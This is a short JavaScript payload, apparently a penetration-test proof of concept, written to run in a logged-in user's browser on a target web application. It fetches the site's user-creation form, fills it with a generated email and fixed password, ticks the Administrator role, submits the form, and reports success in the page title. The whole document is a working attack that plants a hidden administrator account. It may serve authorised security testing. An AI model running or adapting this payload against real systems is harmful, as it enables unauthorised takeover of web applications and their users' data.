(async () => {
  const B = location.origin;
  const html = await (await fetch(B + '/User/Create')).text();
  const doc = new DOMParser().parseFromString(html, 'text/html');
 
  const forms = [...doc.querySelectorAll('form')];
  const form = forms.find(f => f.querySelector('[name="FirstName"],[name="Email"]')) || forms[0];
  if (!form) { document.write(html); return; }
 
  const body = new URLSearchParams();
  for (const el of form.querySelectorAll('input[name],select[name],textarea[name]')) {
    if (!el.name || body.has(el.name)) continue;
    body.set(el.name, el.type === 'checkbox' ? (el.hasAttribute('checked') ? 'true' : 'false') : el.value);
  }
 
  const pw = 'Zz-Poc-2026!Aa1';
  const email = 'zzpoc' + Date.now() + '@example.com';
  if (body.has('FirstName')) body.set('FirstName', 'ZZ');
  if (body.has('Surname')) body.set('Surname', 'Pentest');
  if (body.has('Email')) body.set('Email', email);
  if (body.has('UserName')) body.set('UserName', email);
  for (const el of form.querySelectorAll('input[type="password"][name]')) body.set(el.name, pw);
 
  for (const v of doc.querySelectorAll('input[name$=".Value"]')) {
    const m = v.name.match(/^Roles\[(\d+)\]\.Value$/);
    if (m) body.set('Roles[' + m[1] + '].IsChecked', v.value === 'Administrator' ? 'true' : 'false');
  }
 
  const res = await fetch(B + '/User/Create', { method: 'POST', body });
  const out = await res.text();
  const list = await (await fetch(B + '/User')).text();
  const ok = res.redirected || list.includes(email);
 
  document.open();
  document.write(ok ? list : out);
  document.close();
  document.title = (ok ? 'ATO-OK ' : 'ATO-FAIL ') + res.status + (res.redirected ? ' R' : ' -') + (list.includes(email) ? 'L' : '-') + ' ' + email;
})();